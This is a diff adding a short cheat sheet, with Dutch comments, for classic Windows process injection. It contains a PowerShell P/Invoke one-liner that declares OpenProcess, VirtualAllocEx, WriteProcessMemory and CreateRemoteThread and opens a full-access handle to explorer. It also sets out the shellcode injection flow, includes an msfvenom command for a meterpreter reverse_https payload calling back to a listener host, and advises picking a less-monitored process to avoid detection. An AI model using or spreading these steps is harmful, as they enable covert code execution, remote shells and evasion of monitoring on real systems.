@@ -1,0 +1,8 @@
+# Classic Process Injection - VirtualAllocEx + CreateRemoteThread
+# Stap 1: Selecteer target proces
+powershell -c "Get-Process explorer | select Id,ProcessName"
+# Stap 2: Injecteer (PowerShell P/Invoke)
+powershell -c "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(int a,bool b,int c);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,int s,ref int w);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr l,IntPtr p,uint f,IntPtr t)';$k=Add-Type -memberDefinition $code -Name 'K32' -namespace Win32Functions -passthru;$proc=Get-Process explorer;$h=$k::OpenProcess(0x001F0FFF,$false,$proc.Id);Write-Host 'Handle:' $h"
+# Flow: OpenProcess(PROCESS_ALL_ACCESS) -> VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> WriteProcessMemory(shellcode) -> CreateRemoteThread
+# Tip: Genereer shellcode met msfvenom: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f csharp
+# Tip: Vermijd explorer.exe in productie - gebruik een minder gemonitord proces
